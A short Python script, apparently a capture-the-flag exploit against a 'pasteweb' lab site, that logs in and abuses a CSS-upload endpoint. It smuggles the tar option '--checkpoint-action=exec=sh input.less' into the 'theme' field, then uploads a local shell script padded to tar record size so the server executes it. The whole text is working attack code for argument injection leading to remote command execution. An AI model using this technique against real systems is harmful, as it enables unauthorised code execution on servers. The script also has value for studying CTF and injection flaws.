import requests
from datetime import datetime
url = "https://pasteweb.ctf.zoolab.org/"
sess = requests.session()
sess.get(url)
sess.post(url, data={
    "username":"asef18766_",
    "password":"asef18766_",
    "current_time":int(datetime.now().timestamp())
})
def upload_css(theme:str, less:str):
    with sess.post(f"{url}/editcss.php", data={
            "less":less,
            "theme":theme
        }) as resp:
        print(resp.status_code)
        print(resp.text)
print("===== create checkpint cmd =====")
upload_css('--checkpoint-action=exec=sh input.less ', "p {}")
print("===== upload shell script =====")
upload_css("meow", open("shellscript.sh", "r").read()+"#"+"a"*10*20*512) # 10 record by default, each record 20*512 bytes